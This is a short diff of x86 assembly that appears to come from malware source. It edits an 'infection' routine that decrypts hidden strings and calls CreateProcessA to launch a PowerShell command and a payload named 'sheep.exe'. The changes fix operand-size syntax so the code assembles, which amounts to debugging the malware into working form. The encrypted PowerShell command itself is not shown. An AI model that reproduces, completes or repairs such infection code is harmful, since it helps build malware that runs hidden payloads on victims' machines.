@@ -41,8 +41,8 @@ infection__data:
    mov eax, [ebx+(infection__data__sheep-infection__data__start)]
    inc eax
    mov ecx, eax
-   mov [ebp-4], 4
-   div [ebp-4]
+   mov dword [ebp-4], 4
+   div dword [ebp-4]
    test edx,edx
    jz infection__alloc_sheep_aligned
    mov eax, [ebp-4]
@@ -57,7 +57,7 @@ infection__alloc_sheep_aligned:
    mov eax, [ebx+(infection__data__powershell-infection__data__start)]
    inc eax
    mov ecx, eax
-   div [ebp-4]
+   div dword [ebp-4]
    test edx,edx
    jz infection__alloc_powershell_aligned
    mov eax, [ebp-4]
@@ -119,10 +119,10 @@ infection__alloc_powershell_aligned:
    push 0
    push 0
    lea eax, [ebx+(infection__data__powershell-infection__data__start)]
-   push [ebp-0x10]
+   push dword [ebp-0x10]
    push eax
    call decrypt_string
-   push [ebp-0x10]
+   push dword [ebp-0x10]
    push 0
    call [ebp-4]                 ; CreateProcessA(NULL, "powershell command", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    test eax,eax
@@ -154,10 +154,10 @@ infection__payload_exists:
    push 0
    push 0
    lea eax, [ebx+(infection__data__sheep-infection__data__start)]
-   push [ebp-8]
+   push dword [ebp-8]
    push eax
    call decrypt_string
-   push [ebp-8]
+   push dword [ebp-8]
    push 0
    call [ebp-4]                     ; CreateProcessA(NULL, "sheep.exe", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    
